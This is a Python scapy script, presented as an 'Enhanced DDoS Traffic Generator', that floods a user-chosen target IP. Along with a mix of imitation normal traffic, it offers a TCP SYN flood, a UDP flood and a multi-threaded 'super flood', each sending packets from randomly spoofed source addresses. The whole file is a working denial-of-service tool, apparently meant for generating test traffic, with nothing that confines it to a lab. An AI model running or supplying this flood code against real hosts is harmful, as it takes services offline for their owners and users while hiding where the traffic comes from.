import sys
import time
import random
import threading
import socket
from scapy.all import IP, TCP, UDP, Raw, send, get_if_list, conf

# Setup Target and Interface
def get_config():
    print("\n[!] Configuration Setup")
    
    try:
        # 1. Select Interface
        interfaces = get_if_list()
        print("\nAvailable Interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {i}. {iface}")
        
        if_idx_input = input(f"\nSelect interface (0-{len(interfaces)-1}, default 0): ").strip()
        if_idx = int(if_idx_input) if if_idx_input else 0
        selected_iface = interfaces[if_idx]
        
        # 2. Select Target IP
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            # If loopback is chosen, 127.0.0.1 is the only valid target for local visibility
            if "Loopback" in selected_iface:
                local_ip = "127.0.0.1"
        except:
            local_ip = "127.0.0.1"
        
        target_ip_input = input(f"Enter Target IP (default {local_ip}): ").strip()
        target_ip = target_ip_input if (target_ip_input and target_ip_input != '0') else local_ip
        
        print(f"\n[+] Configured: Interface={selected_iface}, Target={target_ip}")
        return selected_iface, target_ip
    except (EOFError, KeyboardInterrupt, Exception):
        print("\nUsing defaults...")
        return get_if_list()[0], "127.0.0.1"

INTERFACE, TARGET_IP = get_config()

# Global flag to control threads
STOP_EVENT = threading.Event()

def send_normal_traffic():
    """Generates various types of normal traffic"""
    print(f"\n[+] Sending Normal Traffic to {TARGET_IP} on {INTERFACE}...")
    print("    (Mimicking HTTP, DNS, and HTTPS requests)")
    print("    (Press Ctrl+C to stop)")
    
    try:
        # For normal traffic, we can use the default send
        while not STOP_EVENT.is_set():
            proto = random.choice(["HTTP", "DNS", "HTTPS"])
            if proto == "HTTP":
                pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="PA")/Raw(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
            elif proto == "DNS":
                pkt = IP(dst=TARGET_IP)/UDP(dport=53)/Raw(b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01")
            else:
                pkt = IP(dst=TARGET_IP)/TCP(dport=443, flags="S")
            
            send(pkt, iface=INTERFACE, verbose=0)
            time.sleep(random.uniform(0.1, 0.5))
    except KeyboardInterrupt:
        pass

# Global stats
TOTAL_SENT = 0
stats_lock = threading.Lock()

def flood_worker(attack_type, burst_size):
    """Worker function for heavy flood threads"""
    global TOTAL_SENT
    while not STOP_EVENT.is_set():
        try:
            spoofed_src = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packets = []
            for _ in range(burst_size):
                sport = random.randint(1024, 65535)
                if attack_type in ["SYN_FLOOD", "SUPER_FLOOD"]:
                    pkt = IP(src=spoofed_src, dst=TARGET_IP)/TCP(sport=sport, dport=80, flags="S", window=8192)
                elif attack_type == "UDP_FLOOD":
                    pkt = IP(src=spoofed_src, dst=TARGET_IP)/UDP(sport=sport, dport=random.randint(1, 65535))/Raw(b"X"*64)
                packets.append(pkt)
            
            # Use high-level send for better Windows driver compatibility
            send(packets, iface=INTERFACE, verbose=0)
            
            with stats_lock:
                TOTAL_SENT += len(packets)
            
            # Yield for stability
            time.sleep(0.01)
        except Exception:
            time.sleep(0.5)
            continue

def send_ddos_traffic(attack_type):
    """Generates high volume traffic using multi-threading"""
    print(f"\n[!] STARTING {attack_type} ATTACK on {TARGET_IP} using {INTERFACE}...")
    
    # Adjust for stability on Windows
    if attack_type == "SUPER_FLOOD":
        num_threads = 12 
        burst_size = 300
    else:
        num_threads = 4
        burst_size = 50
    
    STOP_EVENT.clear()
    threads = []
    
    for i in range(num_threads):
        t = threading.Thread(target=flood_worker, args=(attack_type, burst_size))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"    (Launched {num_threads} attack threads with burst size {burst_size})")
    print("    (!!! WARNING: EXTREMELY HIGH TRAFFIC VOLUME !!!)")
    print("    (Press Ctrl+C to stop)")
    
    global TOTAL_SENT
    TOTAL_SENT = 0
    
    try:
        while True:
            time.sleep(1)
            with stats_lock:
                print(f"\r[>] Total Packets Sent: {TOTAL_SENT:,}", end="")
    except KeyboardInterrupt:
        STOP_EVENT.set()
        print(f"\n\n[-] Stopping {attack_type} attack...")
        for t in threads:
            t.join(timeout=1)

def main():
    global INTERFACE, TARGET_IP
    while True:
        print("\n" + "="*42)
        print("    ENHANCED DDoS TRAFFIC GENERATOR    ")
        print("="*42)
        print(f"Target: {TARGET_IP} | Interface: {INTERFACE}")
        print("1. Normal Traffic Mix")
        print("2. TCP SYN Flood")
        print("3. UDP Flood")
        print("4. SUPER FLOOD (Massive)")
        print("5. Reconfigure Target/Interface")
        print("6. Exit")
        print("="*42)

        try:
            choice = input("\nSelect Option (1-6): ").strip()
            if not choice: continue
            
            if choice == '1':
                send_normal_traffic()
            elif choice == '2':
                send_ddos_traffic("SYN_FLOOD")
            elif choice == '3':
                send_ddos_traffic("UDP_FLOOD")
            elif choice == '4':
                send_ddos_traffic("SUPER_FLOOD")
            elif choice == '5':
                INTERFACE, TARGET_IP = get_config()
            elif choice == '6':
                sys.exit(0)
            else:
                print("Invalid choice.")
        except (KeyboardInterrupt, EOFError):
            print("\nExiting.")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
